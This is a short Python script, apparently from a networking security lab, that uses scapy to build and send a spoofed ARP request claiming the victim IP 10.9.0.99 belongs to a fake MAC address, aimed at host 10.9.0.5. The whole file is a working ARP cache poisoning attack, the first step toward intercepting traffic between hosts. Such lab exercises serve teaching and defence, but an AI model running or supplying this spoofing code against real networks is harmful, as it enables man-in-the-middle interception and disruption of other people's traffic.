from scapy.all import *

target_IP = "10.9.0.5"
target_MAC = "02:42:0A:09:00:05"

victim_IP = "10.9.0.99"
fake_MAC = "aa:bb:cc:dd:ee:ff"

print("Sending Spoofed ARP Request..........")
# Construct the Ether header
ether = Ether()
ether.dst = target_MAC
ether.src = fake_MAC

# Construct the ARP packet
arp = ARP()

arp.hwsrc = fake_MAC
arp.psrc = victim_IP

# arp.hwdst =
# arp.pdst =

arp.op = 1

frame = ether/arp
sendp(frame)